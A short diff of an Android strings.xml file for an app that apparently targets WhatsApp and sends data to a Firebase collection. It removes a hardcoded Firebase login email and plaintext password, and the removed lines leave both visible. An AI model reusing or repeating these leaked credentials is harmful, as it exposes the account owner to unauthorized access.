@@ -4,11 +4,10 @@
     <string name="target_package">com.whatsapp</string>
     
     <!-- Logging Configuration -->
-    <string name="log_tag">WhatsAppSentinel</string>
+    <string name="log_tag">Sentinel</string>
     
     <!-- Firebase Authentication Configuration -->
-    <string name="firebase_auth_email">jmfrancofraiz@gmail.com</string>
-    <string name="firebase_auth_password">dfaf@|3123sfasf|@#||||</string>
+    <!-- Credentials are now stored in creds.xml for security -->
     
     <!-- Firebase Collection Configuration -->
     <string name="firebase_collection_name">whatsapp</string>
